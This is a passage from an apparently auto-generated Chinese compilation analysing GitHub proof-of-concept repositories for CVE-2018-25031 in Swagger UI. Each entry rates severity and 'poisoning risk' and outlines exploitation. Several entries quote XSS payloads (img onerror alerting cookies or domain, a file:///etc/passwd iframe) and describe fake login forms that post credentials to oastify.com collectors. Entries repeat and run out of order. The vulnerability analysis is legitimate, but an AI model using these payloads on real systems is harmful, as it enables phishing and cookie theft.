代码仓库的投毒风险较低，约为10%。虽然xss.yaml文件包含潜在的XSS攻击代码，但它属于PoC的一部分，用于演示漏洞。其他文件看起来是合法的OpenAPI定义文件或配置文件，没有发现明显的恶意代码。但仍需谨慎，因为攻击者可能在OpenAPI定义中嵌入其他类型的恶意行为，例如SSRF攻击。

**利用方式：**

1.  攻击者创建一个包含恶意内容的OpenAPI定义文件(例如xss.yaml，包含`<noscript>`标签尝试注入XSS)。
2.  攻击者将此文件托管在远程服务器上。
3.  攻击者构造一个包含特定参数的URL，诱使用户打开，该URL指向受影响的Swagger UI实例，并指定加载恶意OpenAPI定义文件的URL作为参数。
4.  当用户打开该URL时，Swagger UI会加载并显示恶意OpenAPI定义文件，从而可能导致欺骗或XSS攻击。

总结来说，该漏洞的利用方式是通过欺骗用户加载恶意的OpenAPI定义文件，从而控制Swagger UI的显示内容，甚至执行恶意脚本。

**项目地址:** [hev0x/CVE-2018-25031-PoC](https://github.com/hev0x/CVE-2018-25031-PoC)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #10

**来源**: [CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md](../2018/CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md)

## CVE-2018-25031-Swagger UI Spoofing/SSRF/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或恶意代码执行

**影响版本:** <= 4.1.2 (可能更高版本也受影响)

**利用条件:** 需要目标系统使用存在漏洞版本的Swagger UI，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程 OpenAPI 定义。漏洞利用方式：

1.  **欺骗攻击 (Spoofing):** 攻击者可以托管一个恶意的 OpenAPI 定义（例如 YAML 或 JSON 文件）。
2.  **诱导用户：** 攻击者构建一个包含指向恶意 OpenAPI 定义的 URL。然后，攻击者诱使用户点击此 URL。这可以通过社会工程学或其他技术实现。
3.  **Swagger UI 显示恶意定义：** 当用户访问包含恶意定义的 URL 时，Swagger UI 将加载并显示该恶意定义。
4.  **XSS/信息窃取:** 恶意的 OpenAPI 定义可以包含恶意HTML/JavaScript代码，例如，在`description`字段中插入`<script>`标签或者`<form>`标签，在用户浏览器中执行，从而窃取用户信息（例如cookie）或执行其他恶意操作，比如进行钓鱼。

从提供的漏洞利用代码来看， `poc3.yaml`和`try.yaml` 文件中， `description` 字段包含了`<form>`标签，模拟了一个登录表单，目的是诱骗用户输入用户名和密码，并将这些信息发送到攻击者控制的服务器 `ttqbbaf0yx45z9zqgpmfcvjyhpngbcz1.oastify.com` 。另外，还包含一个`onerror`事件的图像标签，当图片加载失败时，会执行JavaScript代码`alert(document.cookie)`，从而可能泄露用户的cookie信息。 这些代码证明了利用此漏洞执行XSS攻击，窃取用户信息的可能性。

**投毒风险分析:**

虽然主要的攻击向量是利用Swagger UI的缺陷来展示恶意的OpenAPI定义，但代码仓库中存在一定的投毒风险。这种风险主要体现在：

*   攻击者可能会在 YAML/JSON 文件中加入一些隐蔽的恶意代码，例如混淆的 JavaScript 或利用其他漏洞的代码片段。然而，从提供的代码中看，主要利用方式较为直接，没有明显的隐藏后门。
*   仓库本身可能被篡改，虽然代码相对简单，但仓库维护者的身份以及代码的来源都存在一定的不确定性，不能完全排除代码仓库所有者添加恶意代码的可能性。

因此，综合考虑以上因素，判断存在10%的投毒风险。

**项目地址:** [johnlaurance/CVE-2018-25031-test2](https://github.com/johnlaurance/CVE-2018-25031-test2)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #11

**来源**: [CVE-2018-25031-kriso4os_CVE-2018-25031.md](../2018/CVE-2018-25031-kriso4os_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示欺骗/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本攻击 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI中，攻击者可以通过诱使用户打开一个特制的URL，从而显示远程OpenAPI定义。该URL可以指向攻击者控制的服务器，显示恶意的API文档或利用XSS漏洞。根据提供的POC代码，`XSS.yaml`文件中包含一个XSS payload: `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>`。当Swagger UI渲染此文件时，会触发`alert(document.domain)`，表明XSS攻击成功。`poc.yaml` 仅包含基本的openapi定义，并未包含任何恶意代码。

**有效性：** 提供的POC代码有效，可以利用该漏洞。

**投毒风险：** 经过分析，提供的POC代码主要用于演示漏洞，未发现作者隐藏的恶意代码。因此，投毒风险为0%。代码中引用的远程yaml文件地址指向githubusercontent.com，如果该代码库被劫持或者作者主动添加恶意代码，则可能产生投毒。

**利用方式：** 
1.  攻击者构建一个包含恶意OpenAPI定义的YAML或JSON文件，其中包含XSS payload，例如`XSS.yaml`。
2.  攻击者创建一个恶意URL，该URL指向受影响的Swagger UI实例，并包含参数，指定要加载的恶意OpenAPI定义文件的URL。
3.  攻击者诱使用户点击该恶意URL。
4.  当用户点击恶意URL后，Swagger UI会加载并渲染攻击者提供的OpenAPI定义文件。
5.  如果OpenAPI定义文件中包含XSS payload，则会在用户的浏览器中执行恶意代码，从而导致跨站脚本攻击。
6.  攻击者可以利用该漏洞窃取用户的敏感信息或执行其他恶意操作。此外，攻击者也可以利用该漏洞进行欺骗攻击，例如显示虚假的API文档，诱导用户进行错误的操作。

**项目地址:** [kriso4os/CVE-2018-25031](https://github.com/kriso4os/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #12

**来源**: [CVE-2018-25031-labeebSabbah_CVE-2018-25031.md](../2018/CVE-2018-25031-labeebSabbah_CVE-2018-25031.md)

## CVE-2018-25031-SwaggerUI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/信息泄露/SSRF

**影响应用:** SwaggerUI

**危害等级:** 中危，可能导致信息泄露和潜在的中间人攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者可以通过诱使用户打开特制的 URL 来显示远程 OpenAPI 定义。攻击者提供的 htmli.json 文件包含指向恶意 htmli.yaml 文件的 URL。htmli.yaml 文件包含一段 HTML 代码，该代码伪造一个登录表单，并将用户输入的 email 和 password 发送到 `http://10.212.234.14/`。因此利用方式是，攻击者诱骗用户点击恶意链接，swaggerUI 加载恶意的 OpenAPI 定义，在 SwaggerUI 界面上展示伪造的登录表单，当用户输入登录信息时，攻击者可以窃取用户的凭据。由于yaml文件内容明确，不包含其它恶意代码，因此投毒风险为0%。利用方式总结：

1.  **漏洞利用：** 攻击者制作包含恶意 OpenAPI 定义的 YAML 文件。
2.  **诱导用户：** 攻击者通过某种方式（例如，电子邮件、社交媒体）诱使用户点击包含恶意 YAML 文件 URL 的链接。
3.  **欺骗：** 当用户点击链接时，Swagger UI 会加载恶意 YAML 文件，并显示其中的内容。攻击者可以在 YAML 文件中嵌入恶意 HTML 或 JavaScript 代码，例如伪造登录表单，诱骗用户输入敏感信息。
4.  **信息窃取：** 如果用户在伪造的登录表单中输入了用户名和密码，这些信息将被发送到攻击者指定的服务器。

**有效性：** 提供的 POC 代码有效，可以重现欺骗攻击。

**利用方式总结：**

攻击者利用 Swagger UI 加载远程 OpenAPI 定义的特性，通过诱骗用户点击恶意链接，加载包含恶意 HTML 代码的 YAML 文件，从而实现欺骗攻击。该漏洞的利用需要用户交互，风险等级为中危。

**项目地址:** [labeebSabbah/CVE-2018-25031](https://github.com/labeebSabbah/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #13

**来源**: [CVE-2018-25031-mathis2001_CVE-2018-25031.md](../2018/CVE-2018-25031-mathis2001_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统使用存在漏洞的Swagger UI版本，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2018-25031 是一个存在于 Swagger UI 4.1.2 及更早版本中的漏洞。攻击者可以诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，造成欺骗攻击。

**有效性：**
提供的 POC 代码有效。通过 `configUrl` 或 `url` 参数，Swagger UI 可以加载远程的 OpenAPI 定义文件（JSON 或 YAML）。

**投毒风险：**
该仓库存在一定的投毒风险，风险为60%。原因如下：

*   **远程加载：** POC 利用了 Swagger UI 加载远程定义文件的功能。攻击者可以控制远程文件的内容。
*   **恶意内容：** `f.yaml` 包含大量的 XSS payload，旨在利用 Swagger UI 中的漏洞执行恶意 JavaScript 代码。例如，`<img src=x oNlY=1 oNerror=alert('xxs')//`  等。
*   **钓鱼攻击：**  `f.yaml` 中包含伪造的登录表单，诱导用户提交敏感信息到攻击者控制的服务器。
*   **SSRF风险：** `f.yaml`中包含`<iframe src=file:///etc/passwd></iframe>`，尝试读取服务器本地文件。
*   **不确定性:** 虽然漏洞利用代码的作者提供了一些payload，但这些payload本身具有攻击性。恶意使用这些Payload,可能会被作者追踪到恶意行为。但作者也可能为了混淆视听，将一些恶意的代码进行隐藏。

**利用方式：**

1.  **发现目标：** 寻找使用了存在漏洞的 Swagger UI 版本的应用。
2.  **构造恶意 URL：**  构造包含 `configUrl` 或 `url` 参数的 URL，指向攻击者控制的 JSON 或 YAML 文件。
3.  **诱骗受害者：**  通过钓鱼或其他方式诱骗受害者点击该 URL。
4.  **执行攻击：**  当受害者访问该 URL 时，Swagger UI 会加载攻击者提供的恶意定义文件，从而执行 XSS 代码或进行其他攻击（例如，窃取 cookie、重定向用户等）。

**总结：**
该漏洞的利用依赖于社会工程学，需要诱骗用户点击恶意链接。攻击者可以利用该漏洞进行钓鱼、XSS 攻击，甚至可能进行 SSRF 攻击。同时，提供的 POC 代码包含多种攻击 Payload，存在较高的投毒风险。

**项目地址:** [mathis2001/CVE-2018-25031](https://github.com/mathis2001/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #14

**来源**: [CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md](../2018/CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md)

## CVE-2018-25031 - Swagger UI SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗攻击

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或重定向到恶意API定义

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI 4.1.2及更早版本中的一个漏洞，允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义，从而欺骗用户。从搜索结果和漏洞描述来看，攻击依赖于用户交互，需要诱导用户点击恶意链接。漏洞利用代码提供了一个简单的`exploit.yaml`文件，该文件定义了一个Swagger API规范，包含标题和描述，可能用于展示SSRF漏洞。如果这个YAML文件托管在攻击者控制的服务器上，并通过恶意链接传递给Swagger UI，则Swagger UI会加载该文件，从而实现欺骗攻击。**有效性：** 提供的POC代码本身并不能直接实现攻击，需要结合构造的URL和受害者点击才能生效，因此属于间接PoC。**投毒风险：** 分析POC代码，`exploit.yaml` 非常简单，仅仅包含swagger版本，info信息。作者投毒可能性较低，但不能完全排除，例如通过引用远程资源或包含恶意脚本，风险评估为10%。**利用方式：** 攻击者构造包含恶意swagger定义文件URL的链接，诱使用户点击。用户点击链接后，Swagger UI加载并显示恶意swagger定义，从而实现欺骗或SSRF攻击。

**项目地址:** [natpakun/SSRF-CVE-2018-25031-](https://github.com/natpakun/SSRF-CVE-2018-25031-)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #15

**来源**: [CVE-2018-25031-nigartest_CVE-2018-25031.md](../2018/CVE-2018-25031-nigartest_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示漏洞

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意脚本执行

**影响版本:** <= 4.1.2 (可能影响更高版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱使用户打开精心制作的 URL，来显示远程的恶意 OpenAPI 定义。根据搜索结果和漏洞库信息，该漏洞的核心在于 Swagger UI 未能充分验证和过滤用户提供的 URL，导致可以加载并渲染来自任意来源的 OpenAPI 定义文件。这使得攻击者可以欺骗用户，展示伪造的 API 文档，甚至通过在 OpenAPI 定义中插入恶意 HTML 或 JavaScript 代码，实现跨站脚本攻击（XSS）。

**有效性：** 提供的 POC 代码有效。`domxss.yaml` 文件包含用于触发 DOM XSS 的恶意代码， `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>` 。 `poc.json` 和 `poc.yaml` 文件用于指定要加载的恶意 OpenAPI 定义文件。

**投毒风险：** 仓库中存在少量投毒风险。`domxss.yaml` 使用了 `otlu3omsk1ath8ur17a2kldtmksbg34s.oastify.com` 作为 `basePath`，这可能用于收集受害者的 IP 地址或进行其他形式的侦察。但核心的 XSS payload 和利用方式比较直接，主要的目的是验证漏洞，投毒的可能性较小。风险比例预估为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的 OpenAPI 定义文件（例如 `domxss.yaml`）。
2.  攻击者将此文件托管在公开可访问的 URL 上（例如 GitHub Raw Content）。
3.  攻击者构造一个包含指向恶意 OpenAPI 定义文件 URL 的链接。
4.  攻击者诱使受害者点击该链接。
5.  受害者的浏览器加载 Swagger UI，并从攻击者指定的 URL 加载恶意 OpenAPI 定义文件。
6.  Swagger UI 渲染恶意 OpenAPI 定义文件，从而执行其中的恶意代码（例如 XSS payload）。

**项目地址:** [nigartest/CVE-2018-25031](https://github.com/nigartest/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #16

**来源**: [CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md](../2018/CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-UI Misrepresentation of Critical Information

**漏洞编号:** CVE-2018-25031

**漏洞类型:** UI Misrepresentation of Critical Information (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户信任被欺骗的API定义，进而遭受钓鱼攻击或其他恶意行为。

**影响版本:** < 4.1.3

**利用条件:** 受害者需要点击攻击者构造的恶意URL。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者可以通过诱骗受害者打开一个特制的URL，该URL指向攻击者控制的OpenAPI定义文件，从而在Swagger UI界面上显示被篡改的信息。这可能导致用户信任恶意API定义，并泄露敏感信息或执行非预期的操作。

**有效性分析：**
根据漏洞信息和搜索引擎结果，该漏洞利用需要用户交互，攻击者通过构造恶意URL，诱导用户点击。POC代码使用Selenium模拟浏览器行为，访问目标Swagger UI页面，并加载恶意的OpenAPI定义文件。如果Swagger UI版本低于4.1.3，则可能受到攻击，界面会显示恶意定义的内容。

**投毒风险分析：**
POC代码主要功能是验证目标Swagger UI是否存在CVE-2018-25031漏洞，通过selenium模拟点击，然后检测response log中是否存在外部恶意链接，从而检测目标是否存在该漏洞。
*   `swagger-exploit.py`: 这个脚本使用Selenium自动化测试，访问目标 Swagger UI 页面，并尝试加载两个恶意的 OpenAPI 定义文件（`hacked1.json` 和 `hacked2.json`）。它会检查网络请求日志，以确定目标是否加载了这些文件。如果加载了，则表明目标存在漏洞。该脚本没有发现任何明显的投毒代码。
*   `README.md`: 这个文件提供了关于如何使用脚本的说明。它包含安装依赖项和运行脚本的说明。也没有发现恶意代码。
所以投毒风险很低。

**利用方式分析：**
1.  攻击者构造包含`configUrl`或`url`参数的恶意URL，指向攻击者控制的OpenAPI定义文件。
2.  攻击者诱骗受害者点击该恶意URL，例如通过钓鱼邮件或社交媒体。
3.  受害者的浏览器加载恶意URL，Swagger UI显示攻击者提供的OpenAPI定义文件。
4.  如果攻击者篡改了API定义文件中的信息，例如API端点、参数说明等，受害者可能会被误导，从而遭受攻击，比如提交敏感信息到错误的端点。

该漏洞是一种客户端漏洞，主要利用用户交互进行攻击，通过欺骗用户信任恶意API定义来实现攻击目标。

**项目地址:** [rafaelcintralopes/SwaggerUI-CVE-2018-25031](https://github.com/rafaelcintralopes/SwaggerUI-CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #17

**来源**: [CVE-2018-25031-rasinfosec_CVE-2018-25031.md](../2018/CVE-2018-25031-rasinfosec_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗

**影响版本:** <= 4.1.2

**利用条件:** 需要目标用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031 漏洞允许远程攻击者进行欺骗攻击。通过诱使用户打开特制的 URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞存在于Swagger UI 4.1.2及更早版本中。提供的POC包含一个json文件和一个yaml文件, json文件中定义了yaml文件的url, yaml文件定义了一个openapi接口。攻击者诱使用户访问包含指向恶意json文件的链接的Swagger UI页面，该JSON文件随后加载并显示恶意的 OpenAPI 定义。 投毒风险较低，主要在于如果利用代码仓库被黑客入侵，替换了 `poc.yaml` 文件内容，可能会将用户引导到恶意网站或执行恶意操作，所以风险存在，但概率较低。

**有效性：** 根据漏洞描述和搜索结果，提供的POC代码有效，可以用于显示远程 OpenAPI 定义，从而达到欺骗的目的。

**投毒风险：** 投毒风险评估为 5%。虽然当前提供的 POC 代码本身只是用于演示欺骗攻击，并不包含直接的恶意代码，但是如果攻击者能够控制 `raw.githubusercontent.com` 上的 `poc.yaml` 文件，他们就可以修改显示的 OpenAPI 定义，例如将其指向恶意网站，或包含 XSS 漏洞等。因此，存在一定的投毒风险，但主要取决于对托管 OpenAPI 定义文件的服务器的控制。 此外此POC需要依赖githubusercontent, 如果此域名被污染也可能会出现安全问题。

**利用方式：**

1.  攻击者创建一个恶意的 OpenAPI 定义文件（例如 `poc.yaml`），该文件可能指向恶意网站或包含其他恶意内容。
2.  攻击者创建一个 JSON 文件（例如 `poc.json`），该文件包含指向恶意 OpenAPI 定义文件的 URL。
3.  攻击者诱使用户访问包含指向恶意 JSON 文件的链接的 Swagger UI 页面，例如通过电子邮件、社交媒体等方式。
4.  Swagger UI 加载恶意 JSON 文件，并显示恶意的 OpenAPI 定义。
5.  用户可能会被欺骗，误以为恶意 OpenAPI 定义来自受信任的来源，从而执行恶意操作。

**项目地址:** [rasinfosec/CVE-2018-25031](https://github.com/rasinfosec/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #18

**来源**: [CVE-2018-25031-wrkk112_CVE-2018-25031.md](../2018/CVE-2018-25031-wrkk112_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 是 Swagger UI 中的一个欺骗漏洞。攻击者可以通过诱导受害者打开一个特制的URL，从而显示远程的 OpenAPI 定义。提供的POC代码展示了利用此漏洞的步骤，包括使用一个包含恶意 OpenAPI 定义的JSON文件。该JSON文件指定了远程的YAML文件，其中ismsxss.yaml包含XSS payload。具体来说，ismsxss.yaml包含一段JavaScript代码（`<img onerror=alert(document.domain) src>`），这段代码会在Swagger UI中执行，从而实现跨站脚本攻击（XSS）。

**有效性：** 根据漏洞信息和POC代码，漏洞是有效的。攻击者通过诱导用户打开包含恶意链接的网页，可以执行XSS攻击。

**投毒风险：** 通过分析提供的POC代码，未发现明显的作者隐藏的投毒代码。虽然POC代码中包含XSS payload，但这是为了验证漏洞的存在，并非恶意投毒。因此，投毒风险为0%。

**利用方式：**

1.  攻击者创建一个包含指向恶意 OpenAPI 定义文件的 URL。
2.  攻击者通过社会工程学等方法诱导受害者点击该 URL。
3.  受害者的 Swagger UI 加载恶意的 OpenAPI 定义文件。
4.  恶意 OpenAPI 定义文件中的 XSS payload 在受害者的浏览器中执行，从而实现攻击目的。例如，可以窃取用户的Cookie或执行其他恶意操作。

**项目地址:** [wrkk112/CVE-2018-25031](https://github.com/wrkk112/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---



---

## POC #7

**来源**: [CVE-2018-25031-h2oa_CVE-2018-25031.md](../2018/CVE-2018-25031-h2oa_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统运行存在漏洞的Swagger UI实例，且受害者点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI中的一个漏洞，允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程OpenAPI定义。漏洞的根本原因是Swagger UI在处理URL输入时存在缺陷，允许攻击者控制Swagger UI加载的API定义来源。

**有效性：**
提供的POC代码有效。`poc.json`指定了要加载的远程OpenAPI定义文件的URL，`poc.yaml`包含了将被显示的恶意API定义。当用户访问包含该URL的Swagger UI页面时，会显示`poc.yaml`中定义的API信息，从而实现欺骗。

**投毒风险：**
该存储库存在一定的投毒风险，约为10%。虽然提供的`poc.json`和`poc.yaml`文件本身没有恶意代码，但攻击者可能通过以下方式进行投毒：

1.  **URL替换：** 攻击者可能会修改`poc.json`中的URL，指向包含恶意JavaScript代码的OpenAPI定义文件，从而在用户访问Swagger UI页面时执行恶意代码（虽然此漏洞主要描述是欺骗，但是不排除被利用做成XSS攻击）。
2.  **协作用户投毒：** 如果存储库允许协作，恶意用户可能会提交包含恶意代码的OpenAPI定义文件。

需要强调的是，目前提供的POC代码主要用于欺骗攻击，旨在展示伪造的API定义。要实现完整的攻击，还需要结合其他漏洞（如XSS）或社工手段。

**利用方式：**
1.  攻击者构造包含指向恶意`poc.json`文件的URL。
2.  攻击者诱使受害者点击该URL。可以通过邮件、社交媒体或其他方式进行诱导。
3.  受害者在其浏览器中打开包含该URL的Swagger UI页面。
4.  Swagger UI加载`poc.json`中指定的远程OpenAPI定义文件（`poc.yaml`）。
5.  Swagger UI显示`poc.yaml`中定义的API信息，受害者看到的是被篡改过的API文档。

**项目地址:** [h2oa/CVE-2018-25031](https://github.com/h2oa/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #8

**来源**: [CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md](../2018/CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing Attack)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意链接传播

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及其他版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。通过诱使用户打开精心制作的URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞利用方式是，攻击者构造包含指向恶意 OpenAPI 定义（例如 test.json 或 test.yaml）的 URL，诱使用户在 Swagger UI 中加载该 URL。Swagger UI 会解析并显示恶意 OpenAPI 定义，从而允许攻击者欺骗用户。提供的PoC代码包含 `test.json` 和 `test.yaml` 两个文件。`test.json` 包含指向 `test.yaml` 的链接，而 `test.yaml` 包含 OpenAPI 定义，其中嵌入了恶意链接 `<a href="https://evil.com">Sitio malicioso</a>`。当 Swagger UI 显示此定义时，恶意链接将被呈现，如果用户点击，可能会被重定向到恶意网站。投毒风险较低，因为主要是通过恶意链接进行欺骗，而不是在代码中直接执行恶意操作。主要风险在于用户交互的部分，如果用户不点击恶意链接，风险相对较小。考虑到Github仓库的可信性未知以及`test.yaml`中存在 `evil.com` 的可疑域名，综合估计投毒风险为10%。

**项目地址:** [h4ckt0m/CVE-2018-25031-test](https://github.com/h4ckt0m/CVE-2018-25031-test)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #9

**来源**: [CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md](../2018/CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2 (也可能存在于更高版本)

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义。根据搜索结果和漏洞信息，该漏洞的PoC是有效的。攻击者可以利用此漏洞，通过加载恶意的OpenAPI定义文件（例如xss.yaml）来欺骗用户，甚至可能执行跨站脚本攻击(XSS)。

**有效性：**

提供的PoC代码是有效的，因为它包含一个README.md文件、用于定义远程OpenAPI定义的JSON文件（poc.json），以及两个YAML文件（poc.yaml和xss.yaml）。其中，xss.yaml包含恶意的JavaScript代码，可以触发XSS攻击。

**投毒风险：**

代码仓库的投毒风险较低，约为10%。虽然xss.yaml文件包含潜在的XSS攻击代码，但它属于PoC的一部分，用于演示漏洞。其他文件看起来是合法的OpenAPI定义文件或配置文件，没有发现明显的恶意代码。但仍需谨慎，因为攻击者可能在OpenAPI定义中嵌入其他类型的恶意行为，例如SSRF攻击。

**利用方式：**

1.  攻击者创建一个包含恶意内容的OpenAPI定义文件(例如xss.yaml，包含`<noscript>`标签尝试注入XSS)。
2.  攻击者将此文件托管在远程服务器上。
3.  攻击者构造一个包含特定参数的URL，诱使用户打开，该URL指向受影响的Swagger UI实例，并指定加载恶意OpenAPI定义文件的URL作为参数。
4.  当用户打开该URL时，Swagger UI会加载并显示恶意OpenAPI定义文件，从而可能导致欺骗或XSS攻击。

总结来说，该漏洞的利用方式是通过欺骗用户加载恶意的OpenAPI定义文件，从而控制Swagger UI的显示内容，甚至执行恶意脚本。

**项目地址:** [hev0x/CVE-2018-25031-PoC](https://github.com/hev0x/CVE-2018-25031-PoC)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #10

**来源**: [CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md](../2018/CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md)

## CVE-2018-25031-Swagger UI Spoofing/SSRF/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或恶意代码执行

**影响版本:** <= 4.1.2 (可能更高版本也受影响)

**利用条件:** 需要目标系统使用存在漏洞版本的Swagger UI，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程 OpenAPI 定义。漏洞利用方式：

1.  **欺骗攻击 (Spoofing):** 攻击者可以托管一个恶意的 OpenAPI 定义（例如 YAML 或 JSON 文件）。
2.  **诱导用户：** 攻击者构建一个包含指向恶意 OpenAPI 定义的 URL。然后，攻击者诱使用户点击此 URL。这可以通过社会工程学或其他技术实现。
3.  **Swagger UI 显示恶意定义：** 当用户访问包含恶意定义的 URL 时，Swagger UI 将加载并显示该恶意定义。
4.  **XSS/信息窃取:** 恶意的 OpenAPI 定义可以包含恶意HTML/JavaScript代码，例如，在`description`字段中插入`<script>`标签或者`<form>`标签，在用户浏览器中执行，从而窃取用户信息（例如cookie）或执行其他恶意操作，比如进行钓鱼。

